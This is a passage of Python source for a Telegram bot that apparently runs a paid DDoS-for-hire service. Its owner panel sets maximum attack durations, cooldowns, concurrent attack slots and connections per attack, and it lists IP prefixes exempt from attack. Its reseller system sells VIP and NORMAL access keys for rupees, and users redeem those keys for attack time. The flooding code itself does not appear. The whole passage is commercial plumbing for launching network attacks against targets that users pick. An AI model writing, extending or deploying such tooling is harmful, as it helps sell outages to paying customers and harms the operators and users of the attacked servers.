        response += f"👥 Approved Groups: {approved_groups_collection.count_documents({})}\n"
        response += f"🤖 Active Bots: {len([b for b in get_all_bots() if b.get('active')])}\n"
        response += f"\n⭐ VIP MAX ATTACK: {get_key_max_attack('VIP')}s\n"
        response += f"📀 NORMAL MAX ATTACK: {get_key_max_attack('NORMAL')}s\n"
        
        bot.answer_callback_query(call.id)
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
        
    elif data == "config_back":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("⚙️ Max Attack Time", callback_data="config_maxtime"),
            InlineKeyboardButton("⏳ Cooldown", callback_data="config_cooldown"),
            InlineKeyboardButton("🎯 Max Slots", callback_data="config_slots"),
            InlineKeyboardButton("⚡ Concurrent/Attack", callback_data="config_concurrent"),
            InlineKeyboardButton("🚫 Block IP", callback_data="config_blockip"),
            InlineKeyboardButton("✅ Unblock IP", callback_data="config_unblockip"),
            InlineKeyboardButton("📋 Blocked IPs", callback_data="config_listip"),
            InlineKeyboardButton("🔒 Port Protection", callback_data="config_portprotect"),
            InlineKeyboardButton("📸 Feedback Required", callback_data="config_feedback"),
            InlineKeyboardButton("💰 VIP Pricing", callback_data="config_vip_price"),
            InlineKeyboardButton("💰 NORMAL Pricing", callback_data="config_normal_price"),
            InlineKeyboardButton("👥 Group Settings", callback_data="config_group"),
            InlineKeyboardButton("🤖 Bot Settings", callback_data="config_bot"),
            InlineKeyboardButton("🔧 Maintenance", callback_data="config_maintenance"),
            InlineKeyboardButton("📊 Current Settings", callback_data="config_view")
        )
        bot.edit_message_text(
            "🔧 **CONFIGURATION PANEL**\n\nSelect an option to configure:",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup,
            parse_mode="Markdown"
        )

@bot.callback_query_handler(func=lambda call: call.data in ["portprotect_on", "portprotect_off", "feedback_on", "feedback_off", "maint_on", "maint_off", "group_add", "group_remove", "group_list", "bot_add", "bot_remove", "bot_list"])
def action_callbacks(call):
    user_id = call.from_user.id
    
    if not is_owner(user_id):
        bot.answer_callback_query(call.id, "❌ Only owner can do this!")
        return
    
    if call.data == "portprotect_on":
        set_setting('port_protection', True)
        bot.answer_callback_query(call.id, "✅ Port Protection ENABLED!")
        bot.edit_message_text("✅ Port Protection has been ENABLED!", call.message.chat.id, call.message.message_id)
        
    elif call.data == "portprotect_off":
        set_setting('port_protection', False)
        bot.answer_callback_query(call.id, "✅ Port Protection DISABLED!")
        bot.edit_message_text("✅ Port Protection has been DISABLED!", call.message.chat.id, call.message.message_id)
        
    elif call.data == "feedback_on":
        set_setting('feedback_required', True)
        bot.answer_callback_query(call.id, "✅ Feedback Required ENABLED!")
        bot.edit_message_text("✅ Feedback Required has been ENABLED!", call.message.chat.id, call.message.message_id)
        
    elif call.data == "feedback_off":
        set_setting('feedback_required', False)
        bot.answer_callback_query(call.id, "✅ Feedback Required DISABLED!")
        bot.edit_message_text("✅ Feedback Required has been DISABLED!", call.message.chat.id, call.message.message_id)
        
    elif call.data == "maint_on":
        set_maintenance(True, "Bot is under maintenance. Please try again later.")
        bot.answer_callback_query(call.id, "🔧 Maintenance Mode ENABLED!")
        bot.edit_message_text("🔧 Maintenance Mode has been ENABLED!", call.message.chat.id, call.message.message_id)
        
    elif call.data == "maint_off":
        set_maintenance(False)
        bot.answer_callback_query(call.id, "✅ Maintenance Mode DISABLED!")
        bot.edit_message_text("✅ Maintenance Mode has been DISABLED!", call.message.chat.id, call.message.message_id)
        
    elif call.data == "group_add":
        bot.edit_message_text(
            "➕ **Add Group**\n\nSend: `/addgrp <name> <group_id> <days>`\n\nExample: `/addgrp TESTGROUP -100123456789 30`\n\nType /cancel to abort.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown"
        )
        
    elif call.data == "group_remove":
        bot.edit_message_text(
            "➖ **Remove Group**\n\nSend: `/delgrp <name>`\n\nUse /grpinfo to see group names.\n\nType /cancel to abort.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown"
        )
        
    elif call.data == "group_list":
        groups = list(approved_groups_collection.find())
        if not groups:
            response = "📋 No approved groups found!"
        else:
            response = "👥 **APPROVED GROUPS**\n\n"
            for i, group in enumerate(groups, 1):
                status = "✅ Active" if not group.get('expiry_date') or group['expiry_date'] > datetime.now() else "🔴 Expired"
                response += f"{i}. **{group.get('name', 'Unknown')}**\n"
                response += f"   📱 Group ID: `{group['group_id']}`\n"
                response += f"   📊 Status: {status}\n"
                response += f"   ⚙️ Max Time: {group.get('max_attack_time', get_max_attack_time())}s\n"
                response += f"   🎯 Max Slots: {group.get('max_slots', current_max_slots)}\n"
                response += f"   ⏳ Cooldown: {group.get('cooldown', get_user_cooldown_setting())}s\n"
                response += f"   📸 Feedback Required: {'ON' if group.get('feedback_required', get_setting('feedback_required', True)) else 'OFF'}\n"
                if group.get('expiry_date'):
                    response += f"   📅 Expires: {group['expiry_date'].strftime('%d-%m-%Y')}\n"
                response += "\n"
        bot.answer_callback_query(call.id)
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
        
    elif call.data == "bot_add":
        bot.edit_message_text(
            "➕ **Add Bot**\n\nSend the bot token:\n\nExample: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`\n\nType /cancel to abort.",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(call.message, get_bot_token)
        
    elif call.data == "bot_remove":
        bots = get_all_bots()
        if not bots:
            bot.edit_message_text("📋 No bots found!", call.message.chat.id, call.message.message_id)
        else:
            bot_list = "🤖 **Active Bots:**\n\n"
            for b in bots:
                bot_list += f"• ID: `{b['bot_id']}` | Active: {'✅' if b.get('active') else '❌'}\n"
            bot_list += "\nSend the Bot ID or Token to delete:\nType /cancel to abort."
            bot.edit_message_text(bot_list, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
            bot.register_next_step_handler(call.message, process_del_bot)
        
    elif call.data == "bot_list":
        bots = get_all_bots()
        if not bots:
            response = "📋 No bots found!"
        else:
            response = "🤖 **ALL BOTS**\n\n"
            for b in bots:
                status = "🟢 Running" if b.get('active') else "🔴 Stopped"
                response += f"**Bot ID:** `{b['bot_id']}`\n"
                response += f"**Status:** {status}\n"
                response += f"**Owner:** {b['owner_id']}\n"
                response += f"**Slots:** {b.get('max_slots', 1)}\n"
                response += "──────────────────\n"
        bot.answer_callback_query(call.id)
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode="Markdown")

def set_max_time_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, "❌ Cancelled!")
        return
    
    try:
        value = int(message.text.strip())
        if value < MIN_ATTACK_TIME:
            bot.reply_to(message, f"❌ Value must be at least {MIN_ATTACK_TIME} seconds!")
            return
        set_setting('max_attack_time', value)
        bot.reply_to(message, f"✅ Max Attack Time set to {value} seconds!")
    except:
        bot.reply_to(message, "❌ Invalid number!")

def set_cooldown_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, "❌ Cancelled!")
        return
    
    try:
        value = int(message.text.strip())
        if value < 0:
            bot.reply_to(message, "❌ Cooldown cannot be negative!")
            return
        set_setting('user_cooldown', value)
        bot.reply_to(message, f"✅ Cooldown set to {value} seconds!")
    except:
        bot.reply_to(message, "❌ Invalid number!")

def set_slots_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, "❌ Cancelled!")
        return
    
    try:
        global current_max_slots
        value = int(message.text.strip())
        if value < 1:
            value = 1
        if value > 10:
            value = 10
        current_max_slots = value
        set_setting('max_concurrent_slots', value)
        bot.reply_to(message, f"✅ Max slots set to {value}!\n\nNow {value} attacks can run simultaneously.")
    except:
        bot.reply_to(message, "❌ Invalid number!")

def set_concurrent_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, "❌ Cancelled!")
        return
    
    try:
        value = int(message.text.strip())
        if value < 1:
            value = 1
        if value > 10:
            value = 10
        set_concurrent_limit(value)
        bot.reply_to(message, f"✅ Concurrent per attack set to {value}!\n\nEach API call will use {value} concurrent connections.")
    except:
        bot.reply_to(message, "❌ Invalid number!")

def block_ip_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, "❌ Cancelled!")
        return
    
    ip_prefix = message.text.strip()
    
    if add_blocked_ip(ip_prefix):
        bot.reply_to(message, f"✅ IP prefix `{ip_prefix}*` has been blocked!\n\nAny IP starting with {ip_prefix} cannot be attacked.")
    else:
        bot.reply_to(message, "❌ Failed to block IP!")

def unblock_ip_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, "❌ Cancelled!")
        return
    
    ip_prefix = message.text.strip()
    
    if remove_blocked_ip(ip_prefix):
        bot.reply_to(message, f"✅ IP prefix `{ip_prefix}*` has been unblocked!")
    else:
        bot.reply_to(message, f"❌ IP prefix `{ip_prefix}*` not found in blocked list!")

def get_bot_token(message):
    if message.text == "/cancel":
        bot.reply_to(message, "❌ Operation cancelled!")
        return
    
    bot_token = message.text.strip()
    
    if ":" in bot_token:
        try:
            test_bot = telebot.TeleBot(bot_token)
            bot_info = test_bot.get_me()
            bot_id = bot_info.id
            
            bot.reply_to(message, f"✅ Bot identified: **{bot_info.first_name}** (@{bot_info.username})\n\nSend the **Admin/Owner ID** for this bot:", parse_mode="Markdown")
            bot.register_next_step_handler(message, lambda m: get_bot_admin(m, bot_token, bot_id))
        except Exception as e:
            bot.reply_to(message, f"❌ Invalid token! Error: {str(e)}\n\nUse /addbot to try again.")
    else:
        bot.reply_to(message, "❌ Invalid token format!\n\nUse /addbot to try again.")

def get_bot_admin(message, bot_token, bot_id):
    if message.text == "/cancel":
        bot.reply_to(message, "❌ Operation cancelled!")
        return
    
    try:
        admin_id = int(message.text.strip())
        
        bot.reply_to(message, "⚙️ **Max Slots**\n\nHow many concurrent attacks can this bot handle?\n\nSend a number (1-10):", parse_mode="Markdown")
        bot.register_next_step_handler(message, lambda m: get_bot_slots(m, bot_token, bot_id, admin_id))
    except:
        bot.reply_to(message, "❌ Invalid ID! Send a numeric ID.\n\nUse /addbot to try again.")

def get_bot_slots(message, bot_token, bot_id, admin_id):
    if message.text == "/cancel":
        bot.reply_to(message, "❌ Operation cancelled!")
        return
    
    try:
        max_slots = int(message.text.strip())
        if max_slots < 1:
            max_slots = 1
        if max_slots > 10:
            max_slots = 10
        
        success, result = add_bot(bot_token, admin_id, max_slots)
        
        if success:
            bot_config = get_bot_config(bot_token)
            if bot_config:
                start_bot_instance(bot_config)
            
            bot.reply_to(message, f"✅ **Bot Added Successfully!**\n\n🤖 Bot ID: `{result}`\n👑 Owner ID: {admin_id}\n⚙️ Max Slots: {max_slots}\n\nBot is now running!", parse_mode="Markdown")
        else:
            bot.reply_to(message, f"❌ Failed to add bot: {result}")
    except:
        bot.reply_to(message, "❌ Invalid number!\n\nUse /addbot to try again.")

def process_del_bot(message):
    if message.text == "/cancel":
        bot.reply_to(message, "❌ Operation cancelled!")
        return
    
    bot_input = message.text.strip()
    success, result = delete_bot(bot_input)
    
    if success:
        bot.reply_to(message, f"✅ Bot deleted successfully!")
    else:
        bot.reply_to(message, f"❌ {result}")

# ============ LOAD SAVED SETTINGS ============
saved_max_slots = get_setting('max_concurrent_slots', 4)
current_max_slots = saved_max_slots
current_concurrent_value = get_setting('concurrent_per_attack', 4)

# ============ CONVENIENCE COMMANDS ============

@bot.message_handler(commands=["setconcurrent"])
def set_concurrent_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ This command can only be used by the owner!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /setconcurrent <value>\n\nExample: /setconcurrent 4\n\nThis sets how many concurrent connections each API call uses.")
        return
    
    try:
        value = int(command_parts[1])
        if value < 1:
            value = 1
        if value > 10:
            value = 10
        
        set_concurrent_limit(value)
        bot.reply_to(message, f"✅ Concurrent per attack set to: {value}\n\nEach API call will use {value} concurrent connections.")
    except:
        bot.reply_to(message, "❌ Invalid number! Use: /setconcurrent <value>")

@bot.message_handler(commands=["setgrp"])
def set_group_config_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ This command can only be used by the owner!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /setgrp <group_id> <setting> <value>\n\nSettings: max_time, cooldown, max_slots, feedback\n\nExample: /setgrp -100123456789 max_time 300")
        return
    
    group_id = command_parts[1]
    setting = command_parts[2].lower()
    
    try:
        value = int(command_parts[3])
    except:
        if setting == "feedback":
            value_str = command_parts[3].lower()
            if value_str == "on":
                set_group_feedback_required(group_id, True)
                bot.reply_to(message, f"✅ Group {group_id} feedback required set to ON!")
            elif value_str == "off":
                set_group_feedback_required(group_id, False)
                bot.reply_to(message, f"✅ Group {group_id} feedback required set to OFF!")
            else:
                bot.reply_to(message, "❌ Invalid value! Use 'on' or 'off' for feedback.")
            return
        else:
            bot.reply_to(message, "❌ Invalid value! Must be a number.")
            return
    
    if setting == "max_time":
        if value < MIN_ATTACK_TIME:
            bot.reply_to(message, f"❌ Max time must be at least {MIN_ATTACK_TIME} seconds!")
            return
        set_group_max_attack_time(group_id, value)
        bot.reply_to(message, f"✅ Group {group_id} max attack time set to {value} seconds!")
        
    elif setting == "cooldown":
        if value < 0:
            bot.reply_to(message, "❌ Cooldown cannot be negative!")
            return
        set_group_cooldown_time(group_id, value)
        bot.reply_to(message, f"✅ Group {group_id} cooldown set to {value} seconds!")
        
    elif setting == "max_slots":
        if value < 1 or value > 10:
            bot.reply_to(message, "❌ Max slots must be between 1 and 10!")
            return
        set_group_max_slots(group_id, value)
        bot.reply_to(message, f"✅ Group {group_id} max slots set to {value}!")
        
    else:
        bot.reply_to(message, "❌ Invalid setting! Use: max_time, cooldown, max_slots, feedback")

@bot.message_handler(commands=["blockip"])
def block_ip_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /blockip <ip_prefix>\n\nExample: /blockip 20.204\n\nThis blocks all IPs starting with 20.204", reply_to=message)
        return
    
    ip_prefix = command_parts[1]
    
    if add_blocked_ip(ip_prefix):
        safe_send_message(message.chat.id, f"✅ IP prefix `{ip_prefix}*` has been blocked!\n\nAny IP starting with {ip_prefix} cannot be attacked.", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ Failed to block IP!", reply_to=message)

@bot.message_handler(commands=["unblockip"])
def unblock_ip_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /unblockip <ip_prefix>\n\nExample: /unblockip 20.204", reply_to=message)
        return
    
    ip_prefix = command_parts[1]
    
    if remove_blocked_ip(ip_prefix):
        safe_send_message(message.chat.id, f"✅ IP prefix `{ip_prefix}*` has been unblocked!", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"❌ IP prefix `{ip_prefix}*` not found in blocked list!", reply_to=message)

@bot.message_handler(commands=["blockedips"])
def blocked_ips_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    blocked = get_all_blocked_ips()
    
    if not blocked:
        safe_send_message(message.chat.id, "📋 No IPs are currently blocked!", reply_to=message)
        return
    
    response = "🚫 **BLOCKED IPS LIST**\n\n"
    for i, ip_data in enumerate(blocked, 1):
        response += f"{i}. `{ip_data['ip']}*`\n"
    
    response += f"\n📊 Total Blocked Prefixes: {len(blocked)}"
    
    safe_send_message(message.chat.id, response, reply_to=message)

# ============ ADD RESELLER COMMAND ============

@bot.message_handler(commands=["add_reseller", "addreseller"])
def add_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /add_reseller <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found! Ask them to use /id command first.", reply_to=message)
        return
    
    existing = resellers_collection.find_one({'user_id': reseller_id})
    if existing:
        safe_send_message(message.chat.id, "❌ This user is already a reseller!", reply_to=message)
        return
    
    reseller_doc = {
        'user_id': reseller_id,
        'username': resolved_name,
        'balance': 0,
        'added_at': datetime.now(),
        'added_by': user_id,
        'blocked': False,
        'total_keys_generated': 0
    }
    
    resellers_collection.insert_one(reseller_doc)
    
    try:
        if bot:
            bot.send_message(reseller_id, "🎉 Congratulations! You are now a Reseller!\n\n💰 Use /mysaldo to check balance\n🔑 Use /gen to generate keys\n💵 Use /prices to see pricing")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"✅ Reseller added!\n\n👤 User: {display}\n🆔 ID: {reseller_id}\n💰 Balance: 0 Rs", reply_to=message)

@bot.message_handler(commands=["remove_reseller", "removereseller"])
def remove_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /remove_reseller <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    result = resellers_collection.delete_one({'user_id': reseller_id})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.deleted_count > 0:
        safe_send_message(message.chat.id, f"✅ Reseller {display} removed!", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)

@bot.message_handler(commands=["block_reseller", "blockreseller"])
def block_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /block_reseller <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    result = resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'blocked': True}})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.modified_count > 0:
        safe_send_message(message.chat.id, f"🚫 Reseller {display} blocked!", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ Reseller not found or already blocked!", reply_to=message)

@bot.message_handler(commands=["unblock_reseller", "unblockreseller"])
def unblock_reseller_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /unblock_reseller <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    result = resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'blocked': False}})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    if result.modified_count > 0:
        safe_send_message(message.chat.id, f"✅ Reseller {display} unblocked!", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)

@bot.message_handler(commands=["all_resellers", "allresellers"])
def all_resellers_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    resellers = list(resellers_collection.find())
    
    if not resellers:
        safe_send_message(message.chat.id, "📋 No resellers found!", reply_to=message)
        return
    
    response = "═══════════════════════════\n"
    response += "👥 RESELLER LIST\n"
    response += "═══════════════════════════\n\n"
    
    active_resellers = [r for r in resellers if not r.get('blocked')]
    blocked_resellers = [r for r in resellers if r.get('blocked')]
    
    response += f"🟢 ACTIVE: {len(active_resellers)}\n"
    response += "───────────────────────────\n"
    
    for i, r in enumerate(active_resellers[:10], 1):
        response += f"{i}. 👤 `{r['user_id']}`\n"
        response += f"   💵 Balance: {r.get('balance', 0)} Rs\n"
        response += f"   🔑 Keys: {r.get('total_keys_generated', 0)}\n\n"
    
    if blocked_resellers:
        response += f"🔴 BLOCKED: {len(blocked_resellers)}\n"
        response += "───────────────────────────\n"
        for i, r in enumerate(blocked_resellers[:5], 1):
            response += f"{i}. 👤 `{r['user_id']}`\n"
    
    response += "\n═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

# ============ SALDO COMMANDS ============

@bot.message_handler(commands=["saldoadd"])
def saldo_add_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /saldoadd <id or @username> <amount>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    try:
        amount = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid amount!", reply_to=message)
        return
    
    if amount <= 0:
        safe_send_message(message.chat.id, "❌ Amount must be positive!", reply_to=message)
        return
    
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)
        return
    
    new_balance = reseller.get('balance', 0) + amount
    resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'balance': new_balance}})
    
    try:
        if bot:
            bot.send_message(reseller_id, f"💰 Balance Added!\n\n➕ Added: {amount} Rs\n💵 New Balance: {new_balance} Rs")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"✅ Balance Added!\n\n👤 Reseller: {display}\n🆔 ID: {reseller_id}\n➕ Added: {amount} Rs\n💵 New Balance: {new_balance} Rs", reply_to=message)

@bot.message_handler(commands=["saldoremove"])
def saldo_remove_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /saldoremove <id or @username> <amount>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    try:
        amount = int(command_parts[2])
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid amount!", reply_to=message)
        return
    
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)
        return
    
    new_balance = max(0, reseller.get('balance', 0) - amount)
    resellers_collection.update_one({'user_id': reseller_id}, {'$set': {'balance': new_balance}})
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"✅ Balance Removed!\n\n👤 Reseller: {display}\n🆔 ID: {reseller_id}\n➖ Removed: {amount} Rs\n💵 New Balance: {new_balance} Rs", reply_to=message)

@bot.message_handler(commands=["saldo"])
def saldo_check_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /saldo <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    reseller = resellers_collection.find_one({'user_id': reseller_id})
    if not reseller:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)
        return
    
    display = f"@{resolved_name}" if resolved_name else str(reseller_id)
    safe_send_message(message.chat.id, f"💰 Reseller Balance\n\n👤 User: {display}\n🆔 ID: {reseller_id}\n💵 Balance: {reseller.get('balance', 0)} Rs\n🔑 Total Keys: {reseller.get('total_keys_generated', 0)}\n📊 Status: {'🚫 Blocked' if reseller.get('blocked') else '✅ Active'}", reply_to=message)

@bot.message_handler(commands=["mysaldo"])
def my_saldo_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    
    reseller = get_reseller(user_id)
    if not reseller:
        safe_send_message(message.chat.id, "❌ You are not a reseller!", reply_to=message)
        return
    
    if reseller.get('blocked'):
        safe_send_message(message.chat.id, "🚫 Your panel is blocked!", reply_to=message)
        return
    
    safe_send_message(message.chat.id, f"💰 Your Balance\n\n💵 Balance: {reseller.get('balance', 0)} Rs\n🔑 Total Keys Generated: {reseller.get('total_keys_generated', 0)}\n\n📋 Use /prices to see key prices\n🔑 Use /gen to generate keys", reply_to=message)

# ============ PRICES COMMAND ============

@bot.message_handler(commands=["prices"])
def prices_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not is_reseller(user_id) and not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command is for resellers only!", reply_to=message)
        return
    
    response = "═══════════════════════════\n"
    response += "💵 KEY PRICING\n"
    response += "═══════════════════════════\n\n"
    
    response += "⭐ VIP KEYS:\n"
    for dur, label in DURATION_LABELS.items():
        price = get_key_price('VIP', dur)
        response += f"   {label:<12} ➜  {price} Rs\n"
    
    response += "\n📀 NORMAL KEYS:\n"
    for dur, label in DURATION_LABELS.items():
        price = get_key_price('NORMAL', dur)
        response += f"   {label:<12} ➜  {price} Rs\n"
    
    response += "\n═══════════════════════════\n"
    response += f"⭐ VIP MAX ATTACK: {get_key_max_attack('VIP')}s\n"
    response += f"📀 NORMAL MAX ATTACK: {get_key_max_attack('NORMAL')}s\n"
    response += "═══════════════════════════\n"
    response += "📋 Usage: /gen (then choose key type)\n"
    response += "═══════════════════════════"
    
    safe_send_message(message.chat.id, response, reply_to=message)

# ============ REDEEM COMMAND ============

@bot.message_handler(commands=["redeem"])
def redeem_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /redeem <key>", reply_to=message)
        return
    
    key_input = command_parts[1]
    
    key_doc = keys_collection.find_one({'key': key_input})
    
    if not key_doc:
        safe_send_message(message.chat.id, "❌ Invalid key!", reply_to=message)
        return
    
    max_users = key_doc.get('max_users', 1)
    current_users = key_doc.get('current_users', 0)
    
    if key_doc['used'] and current_users >= max_users:
        safe_send_message(message.chat.id, "❌ This key has already been used!", reply_to=message)
        return
    
    if key_doc.get('is_trail'):
        user_data = users_collection.find_one({'user_id': user_id})
        if user_data and user_data.get('key_expiry') and user_data['key_expiry'] > datetime.now():
            abuse_count = user_data.get('trail_abuse_count', 0) + 1
            users_collection.update_one({'user_id': user_id}, {'$set': {'trail_abuse_count': abuse_count}})
            
            if abuse_count == 1:
                safe_send_message(message.chat.id, "⚠️ Warning: You cannot extend your time with a trail key! Another attempt may result in a ban.", reply_to=message)
            else:
                ban_minutes = 10 * (2 ** (abuse_count - 2))
                ban_expiry = datetime.now() + timedelta(minutes=ban_minutes)
                users_collection.update_one(
                    {'user_id': user_id},
                    {'$set': {'banned': True, 'ban_type': 'temporary', 'ban_expiry': ban_expiry}}
                )
                safe_send_message(message.chat.id, f"🚫 You have been banned for {ban_minutes} minutes due to trail key abuse!", reply_to=message)
            return

    user = users_collection.find_one({'user_id': user_id})
    
    reseller_username = key_doc.get('created_by_username') if key_doc.get('created_by_type') == 'reseller' else None
    key_type = key_doc.get('key_type', 'NORMAL')
    max_attack_time = key_doc.get('max_attack_time', get_key_max_attack(key_type))
    
    if user and user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + timedelta(seconds=key_doc['duration_seconds'])
        
        users_collection.update_one(
            {'user_id': user_id},
            {'$set': {
                'key': key_input,
                'key_expiry': new_expiry,
                'key_duration_seconds': key_doc['duration_seconds'],
                'key_duration_label': key_doc['duration_label'],
                'redeemed_at': datetime.now(),
                'reseller_username': reseller_username,
                'key_type': key_type,
                'max_attack_time': max_attack_time
            }}
        )
        
        new_current = current_users + 1
        if new_current >= max_users:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now(), 'current_users': new_current}}
            )
        else:
            keys_collection.update_one(
                {'key': key_input},
                {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}}
            )
        
        new_remaining = get_time_remaining(user_id)
        safe_send_message(message.chat.id, f"✅ Key Extended!\n\n🔑 Key: `{key_input}`\n⭐ Type: {key_type}\n⏰ Added: {key_doc['duration_label']}\n⏳ Total Time: {new_remaining}\n⚡ Max Attack: {max_attack_time}s", reply_to=message, parse_mode="Markdown")
    else:
        expiry_time = datetime.now() + timedelta(seconds=key_doc['duration_seconds'])
        
        users_collection.update_one(
            {'user_id': user_id},
            {'$set': {
                'user_id': user_id,
                'username': user_name,
                'key': key_input,
                'key_expiry': expiry_time,
                'key_duration_seconds': key_doc['duration_seconds'],
